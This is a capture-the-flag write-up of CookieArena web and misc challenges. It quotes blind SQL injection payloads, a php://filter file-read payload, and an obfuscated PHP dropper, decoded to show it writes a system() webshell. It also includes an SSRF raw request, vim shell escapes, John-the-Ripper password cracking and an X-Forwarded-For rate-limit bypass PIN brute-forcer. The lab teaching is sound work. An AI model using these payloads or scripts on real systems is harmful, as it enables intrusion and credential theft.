---
title: CookieArena CTF
published: 2024-11-27
category: Writeups
tags: [web, cookiearena, ctf, misc, tutorial]
image: "./image/titles/logo-cookiehanhoan.png"
description: Some cool and fun web, misc, tutorial challenges from cookie arena.
draft: false
---

# Tutorial

## The Flag Format

`Flag: CHH{thiS_IS_@_54mP1E_FlaG}`

## Downloadable

`flag` into `flag.php` file after downloading the challenge.

`CHH{Th15_Is_A_d0WnLoAd_ChA1lENGe}`

## HTTP Response Content Type

The challenge is that we need to request a `content-type` header that matches the data format to view the content.

![image](./image/cookiearenactf/1.png)

here we see that the returned data is `html` so we need requests : `text/html`

![image](./image/cookiearenactf/2.png)

`Flag1: CTF{text/html}`

![image](./image/cookiearenactf/3.png)

This time the returned data is an `image` that appears to be a `jpg` so I tried: `image/jpeg`

![image](./image/cookiearenactf/4.png)

`Flag2: CHH{YouCanSee_image/jpg}`

![image](./image/cookiearenactf/5.png)

this last time the format is `pdf` so i used `application/pdf`

![image](./image/cookiearenactf/6.png)

`Flag3: CHH{yeah_application/pdf}`

![image](./image/cookiearenactf/7.png)

![image](./image/cookiearenactf/8.png)

final flag is `CHH{a809e289961ce88adedba653b77d58ba}`

## HTTP Request Transfer Encoding

Flag: `CHH{HTTPTransferEncoding_e64835f651b1673bd1f2b0613298a8b0}`

## HTTP Request Content-Length

Flag: `CHH{HTTPContentLength_bbf82fb9633a072300cba58250c60c8c}`

## PHP Executor Playground

One of the most popular and practical execution functions is `shell_exec`

![image](./image/cookiearenactf/9.png)

![image](./image/cookiearenactf/10.png)

Flag: `CHH{PHPFunct1Ons_893f5732a97f2a7e29115e42627a298d}`

## Client-side Rendering (CSR) aka SPA

This challenge is mostly on the `client`, I tried requesting all `4` pages and got the `flag` on the last page

![image](./image/cookiearenactf/11.png)

Flag: `CHH{REqu3stCre4t3dByJS_a647bda426bed7c2e10494a59e07d8ea}`

## Server-side Rendering (SSR)

This challenge is similar to `Client-side Rendering (CSR)` aka `SPA` challenge, look at the response on the last page which will give us the `flag`

![image](./image/cookiearenactf/12.png)

Flag: `CHH{YOuv3Kn0wnHTML_b5088dc237fea7906b19779f5ee205a0}`

## Simple HTTP Proxy

`run.py`

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
import socket

app = Flask(__name__)

try:
    FLAG = open('/flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'


@app.route('/')
def index():
    return render_template('index.jinja2')


@app.route('/socket', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('socket.jinja2')
    elif request.method == 'POST':
        host = request.form.get('host')
        port = request.form.get('port', type=int)
        data = request.form.get('data')

        retData = ""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                s.sendall(data.encode())
                while True:
                    tmpData = s.recv(1024)
                    retData += tmpData.decode()
                    if not tmpData: break

        except Exception as e:
            return render_template('socket-result.jinja2', data=e)

        return render_template('socket-result.jinja2', data=retData)


@app.route('/admin', methods=['POST'])
def admin():
    if request.remote_addr != '127.0.0.1':
        return 'Only localhost'

    if request.headers.get('User-Agent') != 'Admin Browser':
        return 'Only Admin Browser'

    if request.headers.get('Cookier') != 'admin':
        return 'Only Admin'

    if request.cookies.get('admin') != 'true':
        return 'Admin Cookie'

    if request.form.get('userid') != 'admin':
        return 'Admin id'

    return FLAG


@app.errorhandler(404)
def page_not_found(e):
    # note that we set the 404 status explicitly
    return render_template('404.jinja2'), 404


app.run(host='0.0.0.0', port=1337)
```

we see that the `condition` to have that `flag` is to `POST` to `/admin` and meet the requests conditions:
- must be `internal ip` (`localhost` or `127.0.0.1`) => `Host: 127.0.0.1`
- `User-Agent` header must have value `Admin Browser` => `User-Agent: Admin Browser`
- there is 1 `Cookier` header with value `admin` => `Cookier: admin`
- cookie with key admin value is true => `Cookie: admin=true`
- and finally the userid variable has value equal to admin => `userid: admin`

accordingly we are also given a `socket`, perhaps this is where we can go internally because it is the same program, based on that what we need to do is create a request data and send it to the `socket` according to the request to receive the return. Note that when requesting header we need to provide additional body length and data type

```shell
POST /admin HTTP/1.1
Host: 127.0.0.1
User-Agent: Admin Browser
Cookier: admin
Cookie: admin=true
Content-Length: 12
Content-Type: application/x-www-form-urlencoded

userid=admin
```

![image](./image/cookiearenactf/13.png)

Flag: `CHH{HTTP_via_RaW_Sock3T_f71bcb2e295f2c205cbfa411bd2137cf}`

## Virtual Host Fuzzing

In this challenge we need to understand about `feedback` and `subdomains`, as the challenge description also said.

![image](./image/cookiearenactf/14.png)

here we see that there are 2 response headers `flag` and `Server-Name`, we can see the server name used is `.hacker-dailycookie.cloud`, i spent a lot of time `bruteforce` with `ffuf` but the result is `200` anyway, so it might be like the value of the current `flag` tag is `guess`, in the description it mentions us `admin` and `beta`, the result can see that beta is active.

![image](./image/cookiearenactf/15.png)

![image](./image/cookiearenactf/16.png)

we can see the `flag` tag suggests developer so just use `dev.`

![image](./image/cookiearenactf/17.png)

Flag: `CHH{vir7U@L_h05t_BRUt3_FORCInG_94ad58c6f74aa098ab94a5c48d88242f}`

## Git it right

For this challenge, I first used `dirsearch` to check and find the `.git` public folder, then I used `git-dumper` to get the source.

![image](./image/cookiearenactf/18.png)

![image](./image/cookiearenactf/19.png)

![image](./image/cookiearenactf/20.png)

We see that there is a `super_secure_read_flag.php` file that is used to read `flag.txt`, and `index.html` is where the website is running, the `super_secure_read_flag.php` file is at the same level so we call it to return the `flag`.

![image](./image/cookiearenactf/21.png)

Flag: `CHH{3XpLoIT_.Git_m1scoNF1g_b72745a87ef6932057e0b11762f2f0d1}`

## Break The Editor Jail

When opening it, we see that it is the `vim` online program, hmmmm after a while of `searching` we can see that `vim` can `execute shell` by adding `:!` before command

```vim
:!ls 
```

![image](./image/cookiearenactf/22.png)

```vim
:!cat flag.txt
```

![image](./image/cookiearenactf/23.png)

Flag: `CHH{v1M_c@n_3X3cuT3_th3_cOmManD5_c9ec4a6b9ced1159c60830dc33131615}`

## Easy Git

with this challenge we can see there is a file saying `flag` is removed and we need to see commit history, this is quite common

use `git log`

![image](./image/cookiearenactf/24.png)

we can see there is a commit with an additional `flag`, we need to restore it

use `git checkout` to restore the file

![image](./image/cookiearenactf/25.png)

Flag: `CHH{G1t_c0mm4nD_f0r_7hE_W1n}`

## HTTP Authentication

we get 1 file and i think it is hex, when decode it will see a tag: 
```Authorization: Basic RUhDe2ZyQG00XyMjIUBhfQ==``` and `base64` decoding is ok `flag`

Flag: `EHC{fr@m4_##!@a}`

## Cracking

This is a challenge about using common `passwords` to `bruteforce` office files.

my shell

```shell
└─$ office2john Cracking.docx > office.hash
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ cat office.hash 
Cracking.docx:$office$*2013*100000*256*16*d0b0ff733972e40e90b35340b2685759*9f37067379e97d6c694f6f78c33710f6*f1a9fdd16ba7eeacf5f86d84d0d3276e1714118fa5a8afef6e155b9ee0e5cee5
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ john office.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess         (Cracking.docx)     
1g 0:00:00:00 DONE (2025-07-10 11:40) 11.11g/s 177.7p/s 177.7c/s 177.7C/s 123456..jessica
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

password : `princess`

![image](./image/cookiearenactf/26.png)

Flag: `CHH{m0i_thu_d3u_nen_dc_b4o_m4t}`

## Interceptor

in this challenge i used `https://ezgif.com` to split the `gif` into `images`, and still nothing, it seems the `flag` is still `hidden`, look closely you will see the components of the qr code are cut out and scattered some images, accordingly i extracted them in the correct order from left to right and from top to bottom and combined them into a complete qr and we will get the `flag`

![image](./image/cookiearenactf/27.png)

![image](./image/cookiearenactf/28.png)

![image](./image/cookiearenactf/29.png)

Flag: `Flag{1s_th1s_m1sc3llan30us?}` => `CHH{1s_th1s_m1sc3llan30us?}`

## Audit Web Logs

this is a very good challenge and what we need to do is `analyze` the `log` to see what the `hacker` has `exploited`, maybe there will be a `flag` for us

I see quite a few requests being sent, most notably queries using `sql injection` exploits

![image](./image/cookiearenactf/30.png)

let's start with
```if(ord(substr(database(),%201,1))=32,%20(select%201%20union%20select%202),%200)```

when decoding the urlencode we get:
```sql
if(ord(substr(database(), 1,1))=32, (select 1 union select 2), 0)
```

The meaning of the `query` is to find out if the `first` character value of the database is `32` or not, if so, it will `execute` the command: `(select 1 union select 2)`, which means returning 2 rows corresponding to its number, otherwise returning `0`

`So the question is how do you know when to try it right?`

I think there will be `2` cases like:
- `status_code`: may return different `status code`
- `length`: similarly there will be high possibility of different response length

and in this challenge i will take advantage of the `length`, first we should separate the data on `1` line and then see which element the data will be on

`script`

```python
with open('access.log', 'r') as file:
    lines = file.readline()

print(lines.strip().split())
#['172.17.0.1', '-', '-', '[02/Jun/2020:09:08:15', '+0000]', '"GET', '/', 'HTTP/1.1"', '200', '703', '"-"', '"Mozilla/5.0', '(Windows', 'NT', '10.0;', 'Win64;', 'x64)', 'AppleWebKit/537.36', '(KHTML,', 'like', 'Gecko)', 'Chrome/83.0.4103.61', 'Safari/537.36"']
```

so we can see that the `payload` part will be at the `6th` element counting `from 0` and the element containing the `response length` will be at the `9th` position, next we see what other `lengths` are present

`script`

```python
with open('access.log', 'r') as file:
    lines = file.readlines()

for line in lines:
    if line.strip().split()[9] != "841":
        print(line)
```

![image](./image/cookiearenactf/31.png)

we can see that there are many types of length like `489`, `126`, `733`, `1134`, .... So to be more clear in exploring I will add `database(` condition in payload to see the response

`script`

```python
with open('access.log', 'r') as file:
    lines = file.readlines()

for line in lines:
    if line.strip().split()[9] != "841" and "database(" in line:
        print(line)
```

![image](./image/cookiearenactf/32.png)

everything seems clearer, the result will be error `500` and response length is `1192`, taking advantage of this we will get the database information

`script`

```python
import re

pattern = r'if\(ord\(substr\(database\(\),%20(\d+),1\)\)=(\d+),%20\(select%20\d+%20union%20select%20\d+\),%20\d+\)'
db_name = {}


with open('access.log', 'r') as file:
    lines = file.readlines()

    for line in lines:
        parts = line.strip().split('"')

        if len(parts) < 3:
            continue

        status_len = parts[2].strip().split()
        
        if len(status_len) < 2:
            continue

        length = status_len[1]

        if length == "1192" and 'database(' in line:
            match = re.search(pattern, line)
            if match:
                pos = int(match.group(1))
                val = int(match.group(2))
                db_name[pos] = chr(val)
                print(f"Position: {pos}, Value: {val}")

result = ''.join(db_name[i] for i in sorted(db_name))
print(result)
```

`result`
```plaintext
Position: 1, Value: 115
Position: 2, Value: 105
Position: 3, Value: 109
Position: 4, Value: 112
Position: 5, Value: 108
Position: 6, Value: 101
Position: 7, Value: 95
Position: 8, Value: 98
Position: 9, Value: 111
Position: 10, Value: 97
Position: 11, Value: 114
Position: 12, Value: 100
simple_board
```

so we can see that the `database name` is `simple_board` . Continue we scroll down to find the next exploit.

```shell
172.17.0.1 - - [02/Jun/2020:09:21:34 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(TABLE_NAME,0x3a,COLUMN_NAME)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database()),%201,1))=32,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

Here the purpose of the `payload` is to concatenate strings in the format `table_name:column_name` in the current `database` and see if the character at position `1` is equal to `32` or not, this condition is similar to checking and bruteforce the `database` name. Similarly I used a script to get the result through the `length`

`script`

```python
import re

# pattern = r'if\(ord\(substr\(database\(\),%20(\d+),1\)\)=(\d+),%20\(select%20\d+%20union%20select%20\d+\),%20\d+\)'
pattern = r'if\(ord\(substr\(\(select%20group_concat\(TABLE_NAME,0x3a,COLUMN_NAME\)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database\(\)\),%20(\d+),1\)\)=(\d+),%20\(select%201%20union%20select%202\),%200\)'
table_column = {}

with open('access.log', 'r') as file:
    lines = file.readlines()

    for line in lines:
        parts = line.strip().split('"')

        if len(parts) < 3:
            continue

        status_len = parts[2].strip().split()
        
        if len(status_len) < 2:
            continue

        length = status_len[1]

        if length == "1192" and 'database(' in line:
            match = re.search(pattern, line)
            if match:
                pos = int(match.group(1))
                val = int(match.group(2))
                table_column[pos] = chr(val)
                print(f"Position: {pos}, Value: {val}")

result = ''.join(table_column[i] for i in sorted(table_column))
print(result)
```

`result`

```text
Position: 1, Value: 98
Position: 2, Value: 111
Position: 3, Value: 97
Position: 4, Value: 114
Position: 5, Value: 100
Position: 6, Value: 58
Position: 7, Value: 105
Position: 8, Value: 100
Position: 9, Value: 120
Position: 10, Value: 44
Position: 11, Value: 98
Position: 12, Value: 111
Position: 13, Value: 97
Position: 14, Value: 114
Position: 15, Value: 100
Position: 16, Value: 58
Position: 17, Value: 116
Position: 18, Value: 105
Position: 19, Value: 116
Position: 20, Value: 108
Position: 21, Value: 101
Position: 22, Value: 44
Position: 23, Value: 98
Position: 24, Value: 111
Position: 25, Value: 97
Position: 26, Value: 114
Position: 27, Value: 100
Position: 28, Value: 58
Position: 29, Value: 99
Position: 30, Value: 111
Position: 31, Value: 110
Position: 32, Value: 116
Position: 33, Value: 101
Position: 34, Value: 110
Position: 35, Value: 116
Position: 36, Value: 115
Position: 37, Value: 44
Position: 38, Value: 98
Position: 39, Value: 111
Position: 40, Value: 97
Position: 41, Value: 114
Position: 42, Value: 100
Position: 43, Value: 58
Position: 44, Value: 119
Position: 45, Value: 114
Position: 46, Value: 105
Position: 47, Value: 116
Position: 48, Value: 101
Position: 49, Value: 114
Position: 50, Value: 44
Position: 51, Value: 117
Position: 52, Value: 115
Position: 53, Value: 101
Position: 54, Value: 114
Position: 55, Value: 115
Position: 56, Value: 58
Position: 57, Value: 105
Position: 58, Value: 100
Position: 59, Value: 120
Position: 60, Value: 44
Position: 61, Value: 117
Position: 62, Value: 115
Position: 63, Value: 101
Position: 64, Value: 114
Position: 65, Value: 115
Position: 66, Value: 58
Position: 67, Value: 117
Position: 68, Value: 115
Position: 69, Value: 101
Position: 70, Value: 114
Position: 71, Value: 110
Position: 72, Value: 97
Position: 73, Value: 109
Position: 74, Value: 101
Position: 75, Value: 44
Position: 76, Value: 117
Position: 77, Value: 115
Position: 78, Value: 101
Position: 79, Value: 114
Position: 80, Value: 115
Position: 81, Value: 58
Position: 82, Value: 112
Position: 83, Value: 97
Position: 84, Value: 115
Position: 85, Value: 115
Position: 86, Value: 119
Position: 87, Value: 111
Position: 88, Value: 114
Position: 89, Value: 100
Position: 90, Value: 44
Position: 91, Value: 117
Position: 92, Value: 115
Position: 93, Value: 101
Position: 94, Value: 114
Position: 95, Value: 115
Position: 96, Value: 58
Position: 97, Value: 108
Position: 98, Value: 101
Position: 99, Value: 118
Position: 100, Value: 101
Position: 101, Value: 108
board:idx,board:title,board:contents,board:writer,users:idx,users:username,users:password,users:level
```

So we can see that there are `2 tables`:
- board(idx, title, contents, writer)
- users(idx, username, password, level)

Similarly, let's go to the next `payload` chain to see what the `hacker` has taken.

![image](./image/cookiearenactf/33.png)

```shell
172.17.0.1 - - [02/Jun/2020:09:50:05 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(username,0x3a,password)%20from%20users),%201,1))=32,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

This payload also uses the same method of searching for each character as searching for `database names` and `information` about `tables` and `columns`. This time it is searching for each character in `username:password` in the `users` table, and similarly we just need to change the payload to get the information

`script`

```python
import re

# pattern = r'if\(ord\(substr\(database\(\),%20(\d+),1\)\)=(\d+),%20\(select%20\d+%20union%20select%20\d+\),%20\d+\)'
# pattern = r'if\(ord\(substr\(\(select%20group_concat\(TABLE_NAME,0x3a,COLUMN_NAME\)%20from%20information_schema.columns%20where%20TABLE_SCHEMA=database\(\)\),%20(\d+),1\)\)=(\d+),%20\(select%201%20union%20select%202\),%200\)'
pattern = r'if\(ord\(substr\(\(select%20group_concat\(username,0x3a,password\)%20from%20users\),%20(\d+),1\)\)=(\d+),%20\(select%201%20union%20select%202\),%200\)'

user_pw = {}


with open('access.log', 'r') as file:
    lines = file.readlines()

    for line in lines:
        parts = line.strip().split('"')

        if len(parts) < 3:
            continue

        status_len = parts[2].strip().split()
        
        if len(status_len) < 2:
            continue

        length = status_len[1]

        if length == "1192" and 'group_concat(' in line:
            match = re.search(pattern, line)
            if match:
                pos = int(match.group(1))
                val = int(match.group(2))
                user_pw[pos] = chr(val)
                print(f"Position: {pos}, Value: {val}")

result = ''.join(user_pw[i] for i in sorted(user_pw))
print(result)
```

`result`

```text
Position: 1, Value: 97
Position: 2, Value: 100
Position: 3, Value: 109
Position: 4, Value: 105
Position: 5, Value: 110
Position: 6, Value: 58
Position: 7, Value: 84
Position: 8, Value: 104
Position: 9, Value: 49
Position: 10, Value: 115
Position: 11, Value: 95
Position: 12, Value: 49
Position: 13, Value: 115
Position: 14, Value: 95
Position: 15, Value: 65
Position: 16, Value: 100
Position: 17, Value: 109
Position: 18, Value: 49
Position: 19, Value: 110
Position: 20, Value: 95
Position: 21, Value: 80
Position: 22, Value: 64
Position: 23, Value: 83
Position: 24, Value: 83
Position: 25, Value: 44
Position: 26, Value: 103
Position: 27, Value: 117
Position: 28, Value: 101
Position: 29, Value: 115
Position: 30, Value: 116
Position: 31, Value: 58
Position: 32, Value: 103
Position: 33, Value: 117
Position: 34, Value: 101
Position: 35, Value: 115
Position: 36, Value: 116
admin:Th1s_1s_Adm1n_P@SS,guest:guest
``` 

and we can see `2 accounts`. after the survey just now we can understand that this is a `blind sql injection` attack to exploit information in the database. next let's access the link to answer the questions

1. What is the password of the admin?
answer: `Th1s_1s_Adm1n_P@SS`

2. Payload that the attacker uses to read the config.php file?

In question 2, we try to search for `config.php` to see the related payloads.

![image](./image/cookiearenactf/34.png)

answer: `php://filter/convert.base64-encode/resource=../config.php`

3. What is the path of the code that Hacker uses? (absolute path)

keep looking below the `config.php` file we will see the `absolute path`

![image](./image/cookiearenactf/35.png)

answer: `/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732`

4. Where is Webshell saved? (absolute path)

let's check further, you will see that there is a `php` snippet `embedded`

![image](./image/cookiearenactf/36.png)

```php
%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E
```

after `urldecoded`
```php
<?php 
function m($l,$T=0){
    $K=date('Y-m-d');
    $_=strlen($l);
    $__=strlen($K);
    for($i=0;$i<$_;$i++){
        for($j=0;$j<$__; $j++){
            if($T){
                $l[$i]=$K[$j]^$l[$i];
            }else{
                $l[$i]=$l[$i]^$K[$j];
            }
        }
    }
    return $l;
} 
m('bmha[tqp[gkjpajpw')(m('+rev+sss+lpih+qthke`w+miecaw*tlt'),m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?')); ?>
```

this code performs `obfuscation` of an input string by:
- getting the `current time`
- doing `xor` of characters against the date string and the input string, I guess this is for `webshell` implementation

next i took the time this `code` was inserted to do `xor` then we will have the result for this question

```php
<?php 
function m($l,$T=0){
    // $K=date('Y-m-d');
    $K='2020-06-02';
    $_=strlen($l);
    $__=strlen($K);
    for($i=0;$i<$_;$i++){
        for($j=0;$j<$__; $j++){
            if($T){
                $l[$i]=$K[$j]^$l[$i];
            }else{
                $l[$i]=$l[$i]^$K[$j];
            }
        }
    }
    return $l;
} 
echo m('bmha[tqp[gkjpajpw'). PHP_EOL;
echo m('+rev+sss+lpih+qthke`w+miecaw*tlt').PHP_EOL;
echo m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?');
?>

#file_put_contents
#/var/www/html/uploads/images.php
#<?php header("HTTP/1.1 404 Not Found");system($_GET["c"]);
```

The result is clear, the `attacker` took advantage to write data into the `images.php` file with variable `c` in the `GET` method to execute the shell when calling

answer: `/var/www/html/uploads/images.php`

5. What is the first linux command that Hacker uses in webshell?

in the last question we need to find the `first command` that the `Hacker` `executed`, we know that the hacker wrote the `webshell` to the `images.php` file and the `c` variable. Based on that we see the command is called `whoami`

![image](./image/cookiearenactf/37.png)

answer: `whoami`

![image](./image/cookiearenactf/38.png)

--- 

## Pin Rate Limit

`source`

![image](./image/cookiearenactf/39.png)

in this challenge we can see the web will check the `pin` we enter, maximum `5` times to try, the system will take the pin from the file `/tmp/secure.txt` to make the `storage pin`, if the file does not exist then it will randomly generate a pin from `0000-9999`
the next conditions are:
- check the `ip` from the `header`
- check the number of entries of that ip (if greater than `5` then do not allow further entries)
- if it matches the saved p`in then it will read the `flag`

### Exploit

The `exploit` will aim at not checking how many `IPs`, meaning we can check `IPs` freely.

### Practice

- First, if entered incorrectly, it will return `Incorrect PIN. Attempts remaining: <attemp>`

![image](./image/cookiearenactf/40.png)

- Next, if you enter more than the number of requests, it will display: `You've reached the limit of requests you can send to us`

![image](./image/cookiearenactf/41.png)

and when changing to another `IP`, the number of turns will be `reset` (use the `X-Forwarded-For` tag)

![image](./image/cookiearenactf/42.png)

Based on that, we can't try all `10,000` pin codes by hand, so I wrote a `script` to do this.

`script`

```python
import requests

URL = "http://103.97.125.56:32133/"

max_attempts = 5
pins_code = [f"{i:04d}" for i in range(10000)]

with open("fake_ip.txt", 'r') as f:
    ip_list = f.readlines()

def try_pin(pin, fake_ip):
    headers = {
        "X-Forwarded-For": fake_ip,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Origin": URL,
        "Referer": URL,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "pin": pin
    }
    try:
        resp = requests.post(URL, headers=headers, data=data, timeout=5)
        text = resp.text.lower()

        if "incorrect pin" not in text and "attempts remaining" not in text:
            print(f"\n[✔] FOUND (MAYBE): PIN = {pin}")
            print(resp.text)
            return True

        return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

i=0
for ip in ip_list:
    print(f"--Trying {ip.strip()}--")
    for _ in range(max_attempts):
        pin = pins_code[i]
        print(f"Trying PIN: {pin}")
        if try_pin(pin, ip.strip()):
            exit(0)
        i +=1
```

![image](./image/cookiearenactf/43.png)

and done.

--- 

## Docker Image Secret

`flag` will be found in `mysecret` in the provided files

![image](./image/cookiearenactf/44.png)

---